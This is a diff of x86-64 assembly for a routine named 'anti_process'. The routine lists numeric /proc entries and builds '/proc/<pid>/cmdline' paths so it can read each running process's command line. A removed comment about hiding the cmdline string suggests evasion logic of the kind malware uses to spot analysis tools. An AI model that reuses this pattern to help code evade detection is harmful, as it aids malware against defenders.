@@ -67,6 +67,7 @@ anti_process:
 ; filter process
     mov rcx, rax
     mov rdx, [rsp + 32]
+    mov qword [rsp + 64], rdx
     xor r15, r15
     .search_pid:
         cmp rcx, r15
@@ -78,12 +79,20 @@ anti_process:
         cmp byte [rdx + LDIRENT_64.d_name], 0x39
         jg .inc
 
-        ;;; NOT WORKING NEED TO ADD FILENAME + CMDLINE.
-        ;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-        ; mov [rsp + 5], [rdx + LDIRENT_64.d_name]
-        ; mov rax, qword 0x656e696c646d63 ; need to hide this LOL.
-        mov [rsp + 6], rax
-        ; maybe 0 at the end?>
+    mov rax, [rdx + LDIRENT_64.d_name]
+    mov [rsp + 6], rax
+    xor rax, rax
+
+    .concat:
+        cmp byte [rsp + 7 + rax], 0
+        je .read_proc
+        add rax, 1
+        jmp .concat
+        
+        ;63 6d 64 6c 69 6e 65
+    .read_proc:
+        mov rdx, 0x656e696c646d632f
+        mov [rsp + 7 + rax], rdx
         lea rdi, [rsp]
         mov rsi, 0x0
         mov rax, SYS_OPEN
@@ -101,6 +110,7 @@ anti_process:
         mov [rsp + 48], rax
 
     .inc:
+        mov rdx, qword [rsp + 64]
         movzx rax, word [rdx + LDIRENT_64.d_reclen]
         add r15, rax
         add rdx, rax
